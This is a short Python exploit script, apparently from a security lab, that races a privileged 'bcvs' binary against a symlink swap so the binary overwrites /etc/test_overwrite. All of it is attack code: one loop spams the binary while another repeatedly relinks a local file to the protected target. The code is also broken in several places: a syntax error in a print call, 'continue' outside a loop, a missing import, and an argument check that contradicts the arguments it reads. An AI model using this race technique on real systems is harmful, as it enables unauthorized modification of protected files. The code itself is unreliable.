#!/usr/bin/python
import os, sys
import subprocess

bcvs_exe="/opt/bcvs/bcvs"
target_file="/etc/test_overwrite"
local_file="my_file"

def run_bcvs(opcode, filename):
  call_args = [bcvs_exe, opcode, filename]
  try:
    output = subprocess.check_output(call_args)
  except CalledProcessError as cpe:
    print("bcvs had problem (return code: {})".format(cpe.returncode)
    print("\toutput: {}".format(cpe.output))

def link_to_target():
  # This removes the actual 'local_file' file and creates a link
  # under the same name to the target file
  os.remove(local_file)
  os.symlink(target_file, local_file)

def create_local():
  # Goes the opposite direction of link_to_target
  try:
    os.remove(local_file)
  except OSError as ose:
    if ose.errno == 2:
      # File doesn't exist.Probably first call
      continue
    else:
      print("create_local exception: {}".format(ose))

  open(local_file, "w").close()


def remove_link():
  os.remove(local_file)
  open(local_file, 'w').close()  # Touch(create) a new file

def usage():
  print("Usage: {} <mode> <ci|co> <ci|co filename> -- You probably want 'co'".format(sys.argv[0]))

if __name__ == '__main__':
  if len(sys.argv) != 3:
    usage()
    sys.exit(1)

  if (sys.argv[1] == "runner"):
    while True:
      # Just spam bcvs until the race condition hits
      run_bcvs(sys.argv[2], sys.argv[3])
  elif (sys.argv[1] == "linker"):
    while True:
      # Link and unlink the file we want to modify
      remove_link()
      link_to_target()

